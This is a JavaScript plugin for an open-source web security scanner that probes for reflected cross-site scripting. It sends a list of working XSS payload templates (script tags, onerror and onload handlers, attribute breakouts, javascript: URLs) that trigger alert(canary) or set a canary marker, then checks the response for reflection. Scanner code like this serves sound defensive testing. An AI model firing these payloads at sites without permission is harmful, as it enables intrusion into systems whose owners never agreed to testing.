/* ---
id: xss-reflected-basic
name: Reflected XSS (basic contexts)
description: Detects reflected XSS via canary reflection in executable HTML contexts with control comparison.
author: GASH contributors
severity: high
tags: [xss, client]
safe: false
deep: false
active: true
requires_auth: false
phase: probe
order: 40
api_version: "1.0"
tests: tests/fixtures/xss-reflected-basic/
--- */
// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (C) 2026 Xmar1881 / GASH contributors
// Module: github.com/Xmar1881/Gash
//
// File: plugins/xss/xss-reflected-basic.js
// What: Tier 2 reflected-XSS plugin following the spec section 4.6 JS example.
// Why: This is an active probe. A random identifier only proves reflection;
//   the harmless alert(canary) payload is required for an XSS execution claim.
//   The corpus mixes dialog-trigger and DOM-canary forms so both documented
//   browser-trigger channels (dialog listener, __gash_canary/window.__gashCanary
//   probe) can confirm under --browser-verify; without a browser the finding
//   honestly caps at static-execution-evidence.

// templateBuilders returns payload constructors; each receives a fresh canary.
// Every template is harmless: alert(canary) or a canary marker assignment.
// None exfiltrates data or persists beyond the single request. Breakout forms
// cover double-quote, single-quote, tag injection and URL contexts.
function templateBuilders() {
  return [
    function (c) { return "alert(" + c + ")"; },
    function (c) { return "<script>alert(" + c + ")</script>"; },
    function (c) { return "\"><img src=x onerror=alert(" + c + ")>"; },
    function (c) { return "'><img src=x onerror=alert(" + c + ")>"; },
    function (c) { return "\"><svg onload=alert(" + c + ")>"; },
    function (c) { return "' onmouseover=alert(" + c + ") x='"; },
    function (c) { return "\" onfocus=alert(" + c + ") autofocus x=\""; },
    function (c) { return "<details open ontoggle=alert(" + c + ")>"; },
    function (c) { return "javascript:alert(" + c + ")"; },
    function (c) { return "<script>window.__gashCanary=1</script>"; },
    function (c) { return "\"><img src=x onerror=window.__gashCanary=1>"; },
    function (c) { return "<img src=x onerror=document.body.id='__gash_canary'>"; }
  ];
}

function run(probe, ctx) {
  const points = ctx.injectionPoints();
  const builders = templateBuilders();

  const candidates = [];
  const maxSends = 60; // request budget per run; corpus stays well under it
  let sends = 0;
  for (const point of points) {
    for (const build of builders) {
      if (sends >= maxSends) {
        return candidates;
      }
      sends++;
      const canary = probe.canary();
      const payload = build(canary);
      const resp = probe.send(point.withValue(payload));
      const ev = host.oracles.reflection(resp, canary,
        ["html", "attr-executable", "script", "url", "url-executable"]);
      if (ev) {
        candidates.push(host.candidate(point.withValue(payload), "reflected-xss", ev));
        break;
      }
    }
  }
  return candidates;
}
